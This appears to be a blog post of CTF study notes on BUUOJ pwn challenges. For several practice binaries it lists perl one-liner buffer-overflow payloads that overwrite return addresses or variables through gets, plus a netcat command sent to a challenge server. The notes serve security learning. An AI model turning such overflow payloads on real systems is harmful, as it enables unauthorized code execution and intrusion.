@@ -1,0 +1,39 @@
+---
+layout: post
+title:  "信息安全学习笔记 - BUUOJ Pwn"
+date:   2020-07-11 12:15:38 +0800
+---
+
+
+# BUUOJ PWN
+
+## Prologue
+1. file xxx
+   1. arch, stripped?
+2. checksec
+
+## Problems
+
+1. test_your_nc 
+   1. ida system("/bin/sh");
+   2. perl -e 'print "ls\ncat flag\n"' | nc node3.buuoj.cn 26334
+2. rip
+   1. `system("/bin/sh")` found
+   2. segfault???
+3. warmup_csaw_2016
+   1. amd64, C `gets` and `system("cat flag.txt")` found
+   2. overwrite return address
+   3. `perl -e 'print "A"x72 . "\x0d\x06\x40\x00\x00\x00\x00\x00\n"' | ./warmup_csaw_2016`
+4. pwn1_sctf_2016
+   1. x86, C `gets` and `'system("cat flag.txt")'` found
+   2. overwrite return address
+   3. `std::string`: the source replaces any appearance of `I` with `you` in string input
+   4. `perl -e 'print "I"x20 . "\xef\xbe\xad\xde\x0d\x8f\x04\x08\n"' | ./pwn1`
+5. ciscn_2019_n_1
+   1. amd64, C `gets`
+   2. overwrite a variable and bypass
+   3. floating point number comparison
+      1. more info about `xmm0` [SSE registers](https://en.wikibooks.org/wiki/X86_Assembly/SSE#Registers):
+         1. [saturation arithmetic](https://en.wikipedia.org/wiki/Saturation_arithmetic) and [clamping](https://en.wikipedia.org/wiki/Clamping_(graphics))
+         2. SIMD instructions
+   4. `perl -e 'print "A"x(0x30-4) . "\x00\x80\x34\x41\n"' | ./ciscn_2019_n_1`
